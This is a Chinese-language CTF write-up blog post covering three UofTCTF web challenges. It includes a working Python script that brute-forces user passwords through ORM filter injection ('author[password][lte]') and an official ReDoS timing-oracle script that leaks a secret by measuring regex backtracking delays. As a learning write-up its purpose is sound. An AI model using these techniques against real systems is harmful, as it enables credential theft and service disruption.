---
layout: post
title: 梦开始的地方
tag: CTF
---

# UofTCTF web方向复现
>多伦多大学的校赛，话说我第二场就做国际赛的题真的对吗

## 1.Scavenger Hunt

应该是签到题，在各种地方找flag残躯。
![1](assets/images/CTF/uoft-1-p1.png "1")
![2](assets/images/CTF/uoft-1-p2.png "2")
![3](assets/images/CTF/uoft-1-p3.png "3")
![4](assets/images/CTF/uoft-1-p4.png "4")
![5](assets/images/CTF/uoft-1-p5.png "5")
![6](assets/images/CTF/uoft-1-p6.png "6")
>这个通过路由名称可以看出来需要伪造管理员cookie

![7](assets/images/CTF/uoft-1-p7.png "7")

## 2.Prismatic Blogs

一开始的页面/后可以自由输入并回显，我猜测这里可以进行一些注入。  

观察给出的源码可以发现有posts和login两个路由  
![隐藏路由](assets/images/CTF/uoft-2-源码.png)

通过给出的源码可以看出我们需要拿到作者的密码，然后到login中得到该作者发布的文章，flag就存在于这个文章中。  

随便输点什么发现只回显了最基本的东西，于是尝试盲注。  


```
import requests

users = ["White", "Bob", "Tommy", "Sam"]
up = {}
dict = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
passwd = ""
for user in users:
    for i in range(32):
        for j in range(len(dict)):
            res = requests.get(
                f"http://192.168.1.108:3000/api/posts?author[name]={user}&author[password][lte]={passwd+dict[j]}"
            ).json()
            if len(res["posts"]) > 0:
                passwd += dict[j - 1]
                print(passwd)
                break

    up[user] = passwd[:-1] + dict[dict.index(passwd[-1]) + 1]
    passwd = ""

print(up)
```
>从某个老登那里薅过来的脚本

最后把账号密码一个个试，得到flag。
![flag](assets/images/CTF/uoft-2-flag.png)

## 3.code-DB

某人看了solve跟我说是sql注入，于是我注了半小时注不进去。。无奈看wp才知道是ReDos。于是一边看wp一边学一边做。  

ReDos的核心在于正则表达式的 回溯机制。当正则表达式中包含重复匹配符（如+,?,星号等）并与复杂的嵌套模式结合时，正则引擎会尝试所有可能的匹配路径，导致指数级的计算复杂度。  

计算量的增大会使用时增长，因此可以使用类似时间盲注的方式来查找flag。  


```
import time
import requests
import re
import random
import string
def escape_regex(s):
    return re.sub(r'([.*+?^${}()|[\]\\])', r'\\\1', s)

def measure_time(guess):
    URL = "http://192.168.1.108:3000/search"
    json = {"query":"/^(?={{GUESS}}).*.*.*.*.*.*.*.*.*.*.*.*.*!!!!!!!!!!!!$/".replace("{{GUESS}}", escape_regex(guess)), "language":"All"}
    start = time.time()
    requests.post(URL, json=json)
    end = time.time()
    return end - start

def calculate_threshold(alphabet):
    random_inputs = random.sample(alphabet, 3)
    times = [measure_time(char) for char in random_inputs]
    return sum(times) / len(times)

def main():
    alphabet = string.printable
    flag = "uoftctf{"
    threshold = calculate_threshold(alphabet) + 0.4 # can adjust this for remote

    while True:
        for char in alphabet:
            current_time = measure_time(flag + char)
            if current_time > threshold:
                # try again to see if it was a fluke
                current_time = measure_time(flag + char)
                if current_time > threshold:
                    flag += char
                    print(flag)
                    if char == "}":
                        print(flag)
                        return
                else:
                    continue
                

if __name__ == "__main__":
    main()

```

>因为看了wp，这里给出的也是官方的脚本。  

以下是对核心代码的解释。  


```
def measure_time(guess):
    URL = "http://192.168.1.108:3000/search"
    json = {"query":"/^(?={{GUESS}}).*.*.*.*.*.*.*.*.*.*.*.*.*!!!!!!!!!!!!$/".replace("{{GUESS}}", escape_regex(guess)), "language":"All"}
    start = time.time()
    requests.post(URL, json=json)
    end = time.time()
    return end - start
```


>当 guess 是Flag的正确前缀时先行断言成功。  
引擎继续尝试匹配后面的星号。  
由于真实Flag的结尾不是 !!!!!!!!!!!!，最终的 $ 匹配会失败。  
为了满足匹配，引擎会回溯各种组合，陷入计算陷阱，导致响应时间非常长。  
当 guess 不是Flag的正确前缀时先行断言立即失败。  
整个正则表达式匹配过程直接终止。  
服务器几乎不花时间，响应非常快  

运行拿到flag。